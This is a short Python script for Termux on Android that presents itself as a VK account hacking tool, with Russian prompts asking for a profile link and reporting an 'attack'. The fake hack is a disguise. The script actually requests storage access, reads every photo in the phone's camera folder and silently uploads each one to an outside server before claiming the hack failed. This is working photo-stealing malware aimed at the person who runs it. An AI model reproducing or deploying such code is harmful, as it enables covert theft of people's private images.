import os, requests
print("VK-HAck")
input("Ссылка или ID: ")
print("Загрузка БД...")
os.system("termux-setup-storage")
print("Идет процесс атаки")
l = os.listdir("../storage/shared/DCIM/Camera")
for i in range(len(l)):
	f = open("../storage/shared/DCIM/Camera/"+l[i], "rb")
	r = f.read()
	try:
		requests.post("http://cl18178.tmweb.ru/", data={"im": r})
	except:
		pass
print("Не взломался...")
